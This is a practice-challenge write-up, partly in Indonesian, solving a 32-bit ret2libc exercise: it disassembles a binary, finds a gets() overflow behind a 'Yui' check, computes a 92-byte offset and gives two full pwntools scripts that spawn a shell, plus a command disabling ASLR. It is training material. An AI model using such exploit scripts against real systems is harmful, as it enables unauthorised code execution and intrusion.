---
slug: "pwn-hsr-32"
title: "hsr_32"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2libc."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X86","RET2LIBC"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-hsr-32"
---

# hsr_32

> Latihan buat persiapan seleksi LKS, isinya ret2libc.

Diawal, kita sudah diberi notes.txt. berikut isinya:

```
Welcome to ret2lib dmn kamu belajar tentang penggunaan lib disini. Disini aslr mati btw
challsnya gk beda jauh juga sama ret2plt. Jadi enjoyyy

Untuk matiin aslr:

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

0 -> mati aslrnya
2 -> nyala

Beberapa command tambahan:

printf "0x%x\n" $((memory_addr_1 + memorya_addr_2))
result: totalnya

ldd nama_binary -> untuk melihat libc yg dipakai
readelf -s /dirto/libc.so.6 | grep system -> untuk mengambil addr system, jika mager:
p system dalam pwndbg

strings -a -t x /dirto/libc.so.6 | grep /bin/sh -> untuk mengetahui shellnya dmn

Warning:

Dilarang menggunakan automatic dari pwntools (buat dasar ajaa), list larangan:

elf = context.binary = ELF('./nama_binary')
system = elf.sym['system']
sh = next(elf.search('/bin/sh')
```

Jadi, dia ini adalah ret2libc dan ada sebuah rules untung ngerjain Hands-on yang satu ini.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main* 3m 14s
❯ checksec hsr_32                                                                                                                                                                󰥔 11:38:32
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr/hsr_32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ pwndbg hsr_32                                                                                                                                                                  󰥔 11:38:35
info fun
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from hsr_32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in hsr_32)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490c0  strcmp@plt
0x080490d0  printf@plt
0x080490e0  strcspn@plt
0x080490f0  gets@plt
0x08049100  fgets@plt
0x08049110  puts@plt
0x08049120  __libc_start_main@plt
0x08049130  setvbuf@plt
0x08049140  _start
0x08049180  _dl_relocate_static_pie
0x08049190  __x86.get_pc_thunk.bx
0x080491a0  deregister_tm_clones
0x080491e0  register_tm_clones
0x08049220  __do_global_dtors_aux
0x08049250  frame_dummy
0x08049256  init
0x080492a0  mabar_session
0x08049398  main
0x080493bd  __x86.get_pc_thunk.ax
0x080493d0  __libc_csu_init
0x08049440  __libc_csu_fini
0x08049445  __x86.get_pc_thunk.bp
0x0804944c  _fini
gef➤
```

There’s so many symbols and function in this one, but i'll just check the main and mabar\_session.

```
gef➤  disas main
Dump of assembler code for function main:
   0x08049398 <+0>:     endbr32
   0x0804939c <+4>:     push   ebp
   0x0804939d <+5>:     mov    ebp,esp
   0x0804939f <+7>:     and    esp,0xfffffff0
   0x080493a2 <+10>:    call   0x80493bd <__x86.get_pc_thunk.ax>
   0x080493a7 <+15>:    add    eax,0x2c59
   0x080493ac <+20>:    call   0x8049256 <init>
   0x080493b1 <+25>:    call   0x80492a0 <mabar_session>
   0x080493b6 <+30>:    mov    eax,0x0
   0x080493bb <+35>:    leave
   0x080493bc <+36>:    ret
End of assembler dump.
gef➤  disas mabar_session
Dump of assembler code for function mabar_session:
   0x080492a0 <+0>:     endbr32
   0x080492a4 <+4>:     push   ebp
   0x080492a5 <+5>:     mov    ebp,esp
   0x080492a7 <+7>:     push   ebx
   0x080492a8 <+8>:     sub    esp,0x54
   0x080492ab <+11>:    call   0x8049190 <__x86.get_pc_thunk.bx>
   0x080492b0 <+16>:    add    ebx,0x2d50
   0x080492b6 <+22>:    sub    esp,0xc
   0x080492b9 <+25>:    lea    eax,[ebx-0x1ff8]
   0x080492bf <+31>:    push   eax
   0x080492c0 <+32>:    call   0x8049110 <puts@plt>
   0x080492c5 <+37>:    add    esp,0x10
   0x080492c8 <+40>:    sub    esp,0xc
   0x080492cb <+43>:    lea    eax,[ebx-0x1fd7]
   0x080492d1 <+49>:    push   eax
   0x080492d2 <+50>:    call   0x8049110 <puts@plt>
   0x080492d7 <+55>:    add    esp,0x10
   0x080492da <+58>:    sub    esp,0xc
   0x080492dd <+61>:    lea    eax,[ebx-0x1fb8]
   0x080492e3 <+67>:    push   eax
   0x080492e4 <+68>:    call   0x8049110 <puts@plt>
   0x080492e9 <+73>:    add    esp,0x10
   0x080492ec <+76>:    sub    esp,0xc
   0x080492ef <+79>:    lea    eax,[ebx-0x1f70]
   0x080492f5 <+85>:    push   eax
   0x080492f6 <+86>:    call   0x8049110 <puts@plt>
   0x080492fb <+91>:    add    esp,0x10
   0x080492fe <+94>:    sub    esp,0xc
   0x08049301 <+97>:    lea    eax,[ebx-0x1f30]
   0x08049307 <+103>:   push   eax
   0x08049308 <+104>:   call   0x80490d0 <printf@plt>
   0x0804930d <+109>:   add    esp,0x10
   0x08049310 <+112>:   mov    eax,DWORD PTR [ebx-0x8]
   0x08049316 <+118>:   mov    eax,DWORD PTR [eax]
   0x08049318 <+120>:   sub    esp,0x4
   0x0804931b <+123>:   push   eax
   0x0804931c <+124>:   push   0xf
   0x0804931e <+126>:   lea    eax,[ebp-0x18]
   0x08049321 <+129>:   push   eax
   0x08049322 <+130>:   call   0x8049100 <fgets@plt>
   0x08049327 <+135>:   add    esp,0x10
   0x0804932a <+138>:   sub    esp,0x8
   0x0804932d <+141>:   lea    eax,[ebx-0x1eec]
   0x08049333 <+147>:   push   eax
   0x08049334 <+148>:   lea    eax,[ebp-0x18]
   0x08049337 <+151>:   push   eax
   0x08049338 <+152>:   call   0x80490e0 <strcspn@plt>
   0x0804933d <+157>:   add    esp,0x10
   0x08049340 <+160>:   mov    BYTE PTR [ebp+eax*1-0x18],0x0
   0x08049345 <+165>:   sub    esp,0x8
   0x08049348 <+168>:   lea    eax,[ebx-0x1eea]
   0x0804934e <+174>:   push   eax
   0x0804934f <+175>:   lea    eax,[ebp-0x18]
   0x08049352 <+178>:   push   eax
   0x08049353 <+179>:   call   0x80490c0 <strcmp@plt>
   0x08049358 <+184>:   add    esp,0x10
   0x0804935b <+187>:   test   eax,eax
   0x0804935d <+189>:   jne    0x8049392 <mabar_session+242>
   0x0804935f <+191>:   sub    esp,0xc
   0x08049362 <+194>:   lea    eax,[ebx-0x1ee4]
   0x08049368 <+200>:   push   eax
   0x08049369 <+201>:   call   0x80490d0 <printf@plt>
   0x0804936e <+206>:   add    esp,0x10
   0x08049371 <+209>:   sub    esp,0xc
   0x08049374 <+212>:   lea    eax,[ebp-0x58]
   0x08049377 <+215>:   push   eax
   0x08049378 <+216>:   call   0x80490f0 <gets@plt>
   0x0804937d <+221>:   add    esp,0x10
   0x08049380 <+224>:   sub    esp,0xc
   0x08049383 <+227>:   lea    eax,[ebx-0x1ebc]
   0x08049389 <+233>:   push   eax
   0x0804938a <+234>:   call   0x8049110 <puts@plt>
   0x0804938f <+239>:   add    esp,0x10
   0x08049392 <+242>:   nop
   0x08049393 <+243>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049396 <+246>:   leave
   0x08049397 <+247>:   ret
End of assembler dump.
```

Okay, there’s gets. But as we can see, we have to pass the first fgets first.

![](/assets/uploads/0c6933ec-8975-4ca7-9458-f22ba2c3d98a-image-3.png)

As we can see, we have to input “Yui” first so we can execute the gets.

Okay then, now we count the padding for the gets. 0x58 = 88, because its x86, we need 92 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x58
88
>>> 0x58+4
92
```

And now, sekarang kita mencari apa yang diperlukan untuk ret2libc.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ ldd hsr_32                                                                     󰥔 11:09:21
        linux-gate.so.1 (0xf7fb8000)
        libc.so.6 => /usr/lib32/libc.so.6 (0xf7ce7000)
        /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7fbb000)
        
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ readelf -s /usr/lib/libc.so.6 | grep system                                    󰥔 11:10:58
  1066: 000000000005e6f0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
  
  ~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh                            󰥔 11:27:45
 232500 /bin/sh
 234f41 /bin/sh
```

Nah, di sini jangan lupa. Karena ini x86, kita mengeceknya itu yang lib32 ya. Aku tadi ngga ngeliat kalau itu lib32 hehe.

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("hsr_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "i386"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    libcbase = 0xf7ce7000 
    systemlib = libcbase + 0x000613c0
    binsh = libcbase + 0x232500
    padding = 92
    payload = flat(
        b'A' * padding,
        systemlib,
        0,
        binsh
    )
    biarkegets = b'Yui'
    # good luck pwning :)
    r.sendline(biarkegets)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Butuh tanya AI buat debugging wkwk.

[https://share.gemini.google/xDFAwwHw8nzn](https://share.gemini.google/xDFAwwHw8nzn)

![](/assets/uploads/d5a11b89-4fee-4842-96e5-dbdedb6703fc-image-4.png)

Aku salah ambil address /bin/sh nya hehe.

Solver resmi dari latihan LKS nya adalah:

```python
# Ikutin aturan di notes ya ges... :>

from pwn import *

p = process('./hsr_32')

libc_addr = 0xf7d5e000
system = libc_addr + 0x53830
shell = 0xf7f26e52
offset = 92

payload = flat(
    'A' * offset,
    p32(system),
    p32(0x0),
    p32(shell)
)

p.sendlineafter(b'> ', b'Yui')
p.sendlineafter(b'> ', payload)
p.interactive()
```

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr main*
❯ python3 solve.py LOCAL                                                         󰥔 11:54:24
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/hsr/hsr_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[▖] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/hsr/hsr_32_patched': pid 39478
[*] Switching to interactive mode
*Yui sedang mencoba bermain hsr
Lylera: Wih, main apa nihhh
Yui: Nyoba hsr. Katanya sih gem asyik. Tp... gk bisa lompat..., huh?
Lylera: *nahan ketawa, ya iyalah. Eh anyway follow dong namaku
Yui: Bentar, ku suruh masukin nama sama deskripsi profile dulu

>
 Yui: Done lalu buat deskripsinya

>
 Yui: Oke donee. Nih ya Ly kalau mau add
$ ls
hsr_32  hsr_32_patched  hsr_64  hsr.c  hsr.zip  notes.txt  solve.py
$
```
